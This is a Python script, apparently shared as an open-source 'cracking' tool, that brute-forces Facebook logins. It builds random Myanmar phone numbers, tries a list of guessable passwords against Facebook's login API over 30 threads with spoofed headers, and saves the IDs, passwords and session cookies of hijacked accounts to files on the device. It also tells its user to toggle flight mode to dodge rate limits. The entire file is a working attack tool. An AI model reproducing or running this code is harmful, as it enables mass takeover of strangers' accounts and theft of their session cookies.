#-----------------------[ INFO-CODE ]-----------------------#
"""Open By   : Tanim Hossain [BHOOT-CYBER]
Developer : Tanim Hossain
Github    : Bhoot-Cyber-143
Status    : Open Source"""
#-----------------------[ IMPORT-CODE ]-----------------------#
import os
import sys
import marshal, base64, zlib
from os import path
import os,base64,zlib,pip,urllib
try:
        os.system('clear')
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system('pip install requests futures==2 > /dev/null')
except:pass
#-----------------------[ COLOR-CODE ]-----------------------#
a='\x1b[38;5;118m';b='\x1b[38;5;119m';c='\x1b[38;5;120m';d='\x1b[38;5;121m';e='\x1b[38;5;122m';g='\x1b[38;5;46m';r='\x1b[38;5;196m';w='\033[1;36m'
#-----------------------[ HEXXX-CODE ]-----------------------#
user=[];ok=[];cp=[];twf=[];cpx=[];cokix=[];plist=[];loop=0
#-----------------------[ SC-CODE ]-----------------------#
main_x = '(01) MM Random \n (02) Not Show Cookie MM Random \n (03) Exit menu';bd_x = '255 | 250 | 799 | 779 | 699 | 661 | 988 | 978';ind_x = '+0000 | +0000 | +0000';line_x = '==================================================';cp_x = 'Do You Went Show Cp Ids (Y|N)';coki_x = 'Do You Went Show Cookies (Y|N)';c = 'Choice'
#-----------------------[ LOGO-CODE ]-----------------------#
logo = f"""{w}
 _______  __   __  ___   ___      _______ 
|       ||  |_|  ||   | |   |    |       |
|  _____||       ||   | |   |    |    ___|
| |_____ |       ||   | |   |    |   |___ 
|_____  ||       ||   | |   |___ |    ___|
 _____| || ||_|| ||   | |       ||   |___ 
|_______||_|   |_||___| |_______||_______|
😊😊😊😊😊😊😊😊😊😊😊😊😊😊😊😊😊😊😊😊😊
{line_x}\n (😊) Developer : Kaung Htet\n (😊) Facebook  : Draken Kun\n (😊) Github    : LuCiFeR7238\n (😊) Status    : OPEN\n{line_x}"""
#-----------------------[ CLEAR-CODE ]-----------------------#
def fresh():os.system('clear');print(logo)
#-----------------------[ LINE-CODE ]-----------------------#
def line():print(f'{line_x}')
#-----------------------[ MAIN-CODE ]-----------------------#
def Main():
    fresh();print(f' (01) MM Random Cracking \n (02) Help Center \n (03) Exit Manu ');line()
    manu = input(f' (👉) {c} : ')
    if manu in ['1','01']:country()
    elif manu in ['2','02']:os.system('xdg-open http://github.com/LuCiFeR7238');Main()
    else:Main()
#-----------------------[ COUNTRY-CODE ]-----------------------#
def country():
    fresh();print(f' {main_x} ');line()
    con_ck = input(f' (😊) {c} : ')
    if con_ck in ['1','01']:rndm_MM()
    elif con_ck in ['2','02']:rndm_ind()
    else:Main()
#-----------------------[ RNDM-CODE-BD ]-----------------------#
def rndm_MM():
        fresh();print(f' (😊) Example : {bd_x} ');line();code = input(f' (😊) Find Sim Code : ')
        fresh();print(f' (😊) Example : 1000 | 2000 | 5000 ');line();limit = int(input(f' (😊) Find Limit : '))
        fresh();print(f' (😊) {cp_x} ');line();cpy = input(f' (😊) {c} (Y|N) : ')
        if cpy in ['n','N','no','NO','2','02']:cpx.append(f'n')
        else:cpx.append(f'y')
        fresh();print(f' (😊) {coki_x} ');line();cokiy = input(f' (😊) {c} (Y|N) : ')
        if cokiy in ['n','N','no','NO','2','02']:cokix.append(f'n')
        else:cokix.append(f'y')
        for Kid in range(limit):Bhootxx = ''.join(random.choice(string.digits) for _ in range(6));user.append(Bhootxx)
        with tred(max_workers=30) as Tanim:
                tl = str(len(user))
                fresh();print(f' (😊) Sim Code    : {code} \n (😊) Total Limit : {limit} \n (😊) Use Flight Mode Every 5 Minutes...');line()
                for love in user:
                        ids = '+959'+code+love
                        pasx = [love,code+love,code+love[:2],code+love[:1],code+love[3:],'Myanmar','myanmar','myanmar123','KyawKyaw']
                        Tanim.submit(rndmx,ids,pasx,tl)
#-----------------------[ RNDM-CODE-INDIA ]-----------------------#
def rndm_ind():
        fresh();print(f' (😊) Example : {ind_x}  ');line();code = input(f' (😊) Find Sim Code : ')
        fresh();print(f' (😊) Example : 1000 | 2000 | 5000 ');line();limit = int(input(f' (😊) Find Limit : '))
        fresh();print(f' (😊) {cp_x} ');line();cpy = input(f' (😊) {c} (Y|N) : ')
        if cpy in ['n','N','no','NO','2','02']:cpx.append(f'n')
        else:cpx.append(f'y')
        fresh();print(f' (😊) {coki_x} ');line();cokiy = input(f' (😊) {c} (Y|N) : ')
        if cokiy in ['n','N','no','NO','2','02']:cokix.append(f'n')
        else:cokix.append(f'y')
        for Kid in range(limit):Bhootxx = ''.join(random.choice(string.digits) for _ in range(6));user.append(Bhootxx)
        with tred(max_workers=30) as Tanim:
                tl = str(len(user))
                fresh();print(f' (😊) Sim Code    : {code} \n (😊) Total Limit : {limit} \n (😊) Use Flight Mode Every 5 Minutes...');line()
                for love in user:
                        ids = '+959'+code+love
                        pasx = [love,code+love,code+love[:2],code+love[:1],code+love[3:],'Myanmar','myanmar','myanmar123','KyawKyaw']
                        Tanim.submit(rndmx,ids,pasx,tl)
#-----------------------[ RANDOM-METHOD-CODE ]-----------------------#      
def rndmx(ids,pasx,tl):
        global loop,ok
        sys.stdout.write(f'\r{w} (Loading) ({loop}) ({str(ids)}) ({len(ok)}|{len(cp)})');sys.stdout.flush()
        try:
                for pas in pasx:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        uaddx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/392.0.0.35.101;FBBV/438833785;FBDV/iPhone14,6;FBMD/iPhone;FBSN/iOS;FBSV/16.3;FBSS/2;FBCR/;FBID/phone;FBLC/it;FBOP/0]'
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'as_MM','client_country_code': 'MM','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        headers = {'User-Agent': uaddx, 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                print(f'\r{g} (Open) {str(uid)}  {pas} ')
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                if 'y' in cokix:print(f'\r{w} (🍪) : {coki} ')
                                open('/sdcard/SMILE-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                ok.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                if 'y' in cpx:print(f'\r{r} (7Day) {str(uid)}  {pas} ')
                                open('/sdcard/SMILE-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cp.append(str(uid))
                                break
                        else:continue
                loop+=1
        except:pass                        
#-----------------------[ END-CODE ]-----------------------#
Main()
